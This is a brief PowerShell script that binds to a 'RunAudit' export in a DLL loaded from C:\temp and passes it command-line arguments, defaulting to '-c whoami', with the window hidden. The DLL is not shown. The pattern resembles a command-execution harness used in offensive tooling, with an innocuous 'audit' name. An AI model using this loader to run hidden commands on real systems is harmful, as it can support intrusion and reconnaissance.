$code = @"
[DllImport("C:\\temp\\ConfigAudit.dll", EntryPoint="RunAudit", CharSet=CharSet.Ansi, CallingConvention=CallingConvention.StdCall)]
public static extern void RunAudit(IntPtr hwnd, IntPtr hinst, string cmdLine, int show);
"@
Add-Type -MemberDefinition $code -Name 'Audit' -Namespace 'Config'

$argStr = if ($args.Count -gt 0) { $args -join ' ' } else { '-c whoami' }
[Config.Audit]::RunAudit([IntPtr]::Zero, [IntPtr]::Zero, $argStr, 0)
